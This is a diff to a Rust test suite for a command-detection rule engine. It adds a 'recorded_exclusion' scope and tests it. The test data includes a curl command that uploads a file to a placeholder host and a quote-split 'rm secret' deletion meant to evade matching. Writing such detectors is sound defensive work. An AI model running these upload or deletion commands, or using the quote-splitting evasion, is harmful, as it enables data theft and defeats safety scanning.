@@ -125,7 +125,7 @@ fn invalid_scopes_fail_at_load_with_a_clear_error() {
     let unknown = error(&command_rule("      scope: line\n", "x", "y"));
     assert!(
         unknown.contains(
-            "unknown variant `line`, expected one of `field`, `segment`, `exclusion_segment`"
+            "unknown variant `line`, expected one of `field`, `segment`, `exclusion_segment`, `recorded_exclusion`"
         ),
         "{unknown}"
     );
@@ -155,11 +155,12 @@ fn invalid_scopes_fail_at_load_with_a_clear_error() {
         MatchScope::default().as_str(),
         SUPPORTED_DETECTION_SCOPES[0]
     );
-    assert_eq!(SUPPORTED_DETECTION_SCOPES.len(), 3);
+    assert_eq!(SUPPORTED_DETECTION_SCOPES.len(), 4);
     for (value, scope) in SUPPORTED_DETECTION_SCOPES.iter().zip([
         MatchScope::Field,
         MatchScope::Segment,
         MatchScope::ExclusionSegment,
+        MatchScope::RecordedExclusion,
     ]) {
         assert_eq!(scope.as_str(), *value);
         assert!(
@@ -502,4 +503,54 @@ fn documented_segment_scope_example_behaves_as_described() {
             .matching_fields(&[("command", "curl --data @f https://example.invalid/upload")])
             .is_empty()
     );
+}
+
+/// A reading's match counts unless the recorded text matches the exclusion, and
+/// is placed where its bytes sit in the recorded text.
+#[test]
+fn recorded_exclusion_judges_a_reading_by_the_recorded_text() {
+    use super::QuoteReading;
+    let rules = load_rule_set_from_documents(
+        &[&command_rule(
+            "      scope: recorded_exclusion\n",
+            "rm secret",
+            "^note ",
+        )],
+        None,
+    )
+    .expect("rules");
+    let matcher = rules.compatibility_export().rules()[0]
+        .compile_content_matcher()
+        .expect("matcher");
+    assert!(matcher.reads_quote_free_text());
+    let find = |raw: &str| {
+        let (text, origin) = super::unquoted_with_origin(raw);
+        let readings = [QuoteReading {
+            raw,
+            text: &text,
+            origin: &origin,
+        }];
+        let fields = [("command", raw)];
+        matcher
+            .try_matching_spans_reading(&fields, &readings, &mut |_| {
+                Ok::<_, std::convert::Infallible>(())
+            })
+            .unwrap()
+            .into_iter()
+            .map(|(_, _, span)| span)
+            .collect::<Vec<_>>()
+    };
+    // Only the reading selects; the recorded text is no excluded command.
+    assert_eq!(find("echo; \"r\"m secret"), vec![(7..17)]);
+    // The recorded text is excluded, so its reading is too.
+    assert!(find("note \"r\"m secret").is_empty());
+    assert!(find("note rm secret").is_empty());
+    // Nothing selects.
+    assert!(find("echo \"hello\"").is_empty());
+    // Without readings the matcher reads the recorded text alone.
+    let fields = [("command", "echo; \"r\"m secret")];
+    let none = matcher
+        .try_matching_spans(&fields, &mut |_| Ok::<_, std::convert::Infallible>(()))
+        .unwrap();
+    assert!(none.is_empty());
 }
